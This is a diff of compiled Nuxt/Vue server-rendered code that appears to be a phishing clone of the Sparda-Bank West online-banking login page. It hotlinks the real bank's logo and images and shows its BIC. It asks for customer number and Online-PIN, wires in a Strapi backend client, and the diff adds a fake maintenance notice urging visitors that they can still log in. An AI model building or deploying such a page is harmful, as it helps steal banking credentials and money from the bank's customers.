@@ -1,55 +1,61 @@
-import { p as publicAssetsURL } from '../../handlers/renderer.mjs';
-import { useSSRContext, defineComponent, mergeProps, ref } from 'vue';
-import { ssrRenderAttrs, ssrRenderComponent, ssrRenderAttr } from 'vue/server-renderer';
-import { _ as _export_sfc, u as useStrapiClient, a as useStrapiVersion } from '../server.mjs';
-import 'vue-bundle-renderer/runtime';
-import '../../nitro/node-server.mjs';
-import 'node:http';
-import 'node:https';
-import 'node:zlib';
-import 'node:stream';
-import 'node:buffer';
-import 'node:util';
-import 'node:url';
-import 'node:net';
-import 'node:fs';
-import 'node:path';
-import 'fs';
-import 'path';
-import 'devalue';
-import '@unhead/ssr';
-import 'unhead';
-import '@unhead/shared';
-import 'vue-router';
-import 'qs';
-
-const _imports_0 = "" + publicAssetsURL("images/spardalogo.jpg");
-const _sfc_main$5 = {};
-function _sfc_ssrRender$1(_ctx, _push, _parent, _attrs) {
-  _push(`<div${ssrRenderAttrs(mergeProps({ id: "header" }, _attrs))}><img${ssrRenderAttr("src", _imports_0)} alt="Logo"><p>Sparda-Bank West eG <b>GENODEF1S08</b></p></div>`);
+import { mergeProps, useSSRContext, defineComponent, ref } from "vue";
+import { ssrRenderAttrs, ssrRenderComponent } from "vue/server-renderer";
+import { _ as _export_sfc, u as useStrapiClient, a as useStrapiVersion } from "../server.mjs";
+import "hookable";
+import "destr";
+import "devalue";
+import "defu";
+import "klona";
+import "ofetch";
+import "#internal/nitro";
+import "unctx";
+import "@unhead/shared";
+import "vue-router";
+import "h3";
+import "ufo";
+import "cookie-es";
+import "ohash";
+import "qs";
+const Header_vue_vue_type_style_index_0_lang = "";
+const _sfc_main$6 = {};
+function _sfc_ssrRender$2(_ctx, _push, _parent, _attrs) {
+  _push(`<div${ssrRenderAttrs(mergeProps({ id: "header" }, _attrs))}><img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/logo/spardalogo.gif" alt="Logo"><p>Sparda-Bank West eG <b>GENODEF1S08</b></p></div>`);
 }
-const _sfc_setup$5 = _sfc_main$5.setup;
-_sfc_main$5.setup = (props, ctx) => {
+const _sfc_setup$6 = _sfc_main$6.setup;
+_sfc_main$6.setup = (props, ctx) => {
   const ssrContext = useSSRContext();
   (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/components/Header.vue");
-  return _sfc_setup$5 ? _sfc_setup$5(props, ctx) : void 0;
+  return _sfc_setup$6 ? _sfc_setup$6(props, ctx) : void 0;
 };
-const __nuxt_component_0 = /* @__PURE__ */ _export_sfc(_sfc_main$5, [["ssrRender", _sfc_ssrRender$1]]);
-const _sfc_main$4 = /* @__PURE__ */ defineComponent({
+const __nuxt_component_0$1 = /* @__PURE__ */ _export_sfc(_sfc_main$6, [["ssrRender", _sfc_ssrRender$2]]);
+const _sfc_main$5 = /* @__PURE__ */ defineComponent({
   __name: "Tabs",
   __ssrInlineRender: true,
   setup(__props) {
     return (_ctx, _push, _parent, _attrs) => {
-      _push(`<div${ssrRenderAttrs(mergeProps({ id: "tabs" }, _attrs))}><div class="first"><img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/reiter-freischaltung.png"></div><div class="second"><input type="image" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/reiter-demokonto.png" title="Banking im Demomodus \xF6ffnen"></div></div>`);
+      _push(`<div${ssrRenderAttrs(mergeProps({ id: "tabs" }, _attrs))}><div class="first"><img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/reiter-freischaltung.png"></div><div class="second"><input type="image" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/reiter-demokonto.png" title="Banking im Demomodus öffnen"></div></div>`);
     };
   }
 });
+const Tabs_vue_vue_type_style_index_0_lang = "";
+const _sfc_setup$5 = _sfc_main$5.setup;
+_sfc_main$5.setup = (props, ctx) => {
+  const ssrContext = useSSRContext();
+  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/components/Tabs.vue");
+  return _sfc_setup$5 ? _sfc_setup$5(props, ctx) : void 0;
+};
+const InWork_vue_vue_type_style_index_0_lang = "";
+const _sfc_main$4 = {};
+function _sfc_ssrRender$1(_ctx, _push, _parent, _attrs) {
+  _push(`<div${ssrRenderAttrs(mergeProps({ id: "inworkinfo" }, _attrs))}><div class="top"></div><div class="main"><p><strong>Wartungsarbeiten:</strong><br> Eventuell sind momentan einige Dienste, aufgrund von Wartungsarbeiten auf der Website, nicht verfügbar. <br> Wir bitten um Ihr Verständnis. <br> Trotz dieser Wartungsarbeiten werden Sie nicht eingeschränkt sich einzuloggen. <br> Wir bitten um Ihr Verständnis! </p></div><div class="bottom"></div></div>`);
+}
 const _sfc_setup$4 = _sfc_main$4.setup;
 _sfc_main$4.setup = (props, ctx) => {
   const ssrContext = useSSRContext();
-  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/components/Tabs.vue");
+  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/components/InWork.vue");
   return _sfc_setup$4 ? _sfc_setup$4(props, ctx) : void 0;
 };
+const __nuxt_component_0 = /* @__PURE__ */ _export_sfc(_sfc_main$4, [["ssrRender", _sfc_ssrRender$1]]);
 const useStrapi4 = () => {
   const client = useStrapiClient();
   const version = useStrapiVersion();
@@ -100,23 +106,29 @@ const _sfc_main$3 = /* @__PURE__ */ defineComponent({
     useStrapi();
     ref({ value: null });
     ref({ value: null });
+    ref({ value: null });
     return (_ctx, _push, _parent, _attrs) => {
-      _push(`<!--[--><div id="loginForm"><div class="input user"><div class="textField"><label for="user">Kundennummer</label></div><input type="text" id="inputUser" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)"><img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png"></div><div class="input pin"><div class="textField"><label for="onlinePin">Online-Pin</label></div><input type="password" id="inputOnlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)"><img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png"></div></div><div id="loginBtn"><img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/buttonFlach_Jetzt_einloggen.png"></div><!--]-->`);
+      const _component_InWork = __nuxt_component_0;
+      _push(`<!--[--><div id="loginForm"><div class="input user"><div class="textField"><label for="user">Kundennummer</label></div><input type="text" id="inputUser" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)"><img title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png"></div><div class="input pin"><div class="textField"><label for="onlinePin">Online-Pin</label></div><input type="password" id="inputOnlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)"><img title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png"></div></div><button id="loginBtn"><img title="Jetzt einloggen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/buttonFlach_Jetzt_einloggen.png"></button>`);
+      _push(ssrRenderComponent(_component_InWork, null, null, _parent));
+      _push(`<!--]-->`);
     };
   }
 });
+const LoginForm_vue_vue_type_style_index_0_lang = "";
 const _sfc_setup$3 = _sfc_main$3.setup;
 _sfc_main$3.setup = (props, ctx) => {
   const ssrContext = useSSRContext();
   (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/components/LoginForm.vue");
   return _sfc_setup$3 ? _sfc_setup$3(props, ctx) : void 0;
 };
+const scamWarn_vue_vue_type_style_index_0_lang = "";
 const _sfc_main$2 = {
   __name: "scamWarn",
   __ssrInlineRender: true,
   setup(__props) {
     return (_ctx, _push, _parent, _attrs) => {
-      _push(`<div${ssrRenderAttrs(mergeProps({ id: "scamWarn" }, _attrs))}><img src="https://banking.sparda-west.de/portalcontent/banking_portal/bilder/west/sparda-west/198_108_hinweis.jpg"><p><b>Wichtige Info: Betrugsversuche durch Anrufe</b></p><p class="describtion">Geben Sie keine Auftr\xE4ge in der SecureApp frei, die Sie nicht selbst im Online-Banking eingestellt haben. Nennen Sie NIE Ihre Zugangsdaten. Legen Sie direkt auf.</p><img class="moreInfoBtn" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/button_Mehr_Informationen.png"></div>`);
+      _push(`<div${ssrRenderAttrs(mergeProps({ id: "scamWarn" }, _attrs))}><img src="https://banking.sparda-west.de/portalcontent/banking_portal/bilder/west/sparda-west/198_108_login3.jpg"><p><b>Wichtige Info: Betrugsversuche durch Anrufe</b></p><p class="describtion">Geben Sie keine Aufträge in der SecureApp frei, die Sie nicht selbst im Online-Banking eingestellt haben. Nennen Sie NIE Ihre Zugangsdaten. Legen Sie direkt auf.</p><img class="moreInfoBtn" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/button_Mehr_Informationen.png"></div>`);
     };
   }
 };
@@ -136,16 +148,18 @@ const _sfc_main$1 = /* @__PURE__ */ defineComponent({
     };
   }
 });
+const Footer_vue_vue_type_style_index_0_lang = "";
 const _sfc_setup$1 = _sfc_main$1.setup;
 _sfc_main$1.setup = (props, ctx) => {
   const ssrContext = useSSRContext();
   (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/components/Footer.vue");
   return _sfc_setup$1 ? _sfc_setup$1(props, ctx) : void 0;
 };
+const index_vue_vue_type_style_index_0_lang = "";
 const _sfc_main = {};
 function _sfc_ssrRender(_ctx, _push, _parent, _attrs) {
-  const _component_Header = __nuxt_component_0;
-  const _component_Tabs = _sfc_main$4;
+  const _component_Header = __nuxt_component_0$1;
+  const _component_Tabs = _sfc_main$5;
   const _component_LoginForm = _sfc_main$3;
   const _component_ScamWarn = __nuxt_component_3;
   const _component_Footer = _sfc_main$1;
@@ -167,6 +181,7 @@ _sfc_main.setup = (props, ctx) => {
   return _sfc_setup ? _sfc_setup(props, ctx) : void 0;
 };
 const index = /* @__PURE__ */ _export_sfc(_sfc_main, [["ssrRender", _sfc_ssrRender]]);
-
-export { index as default };
-//# sourceMappingURL=index-bdd809ef.mjs.map
+export {
+  index as default
+};
+//# sourceMappingURL=index-fbd22247.js.map
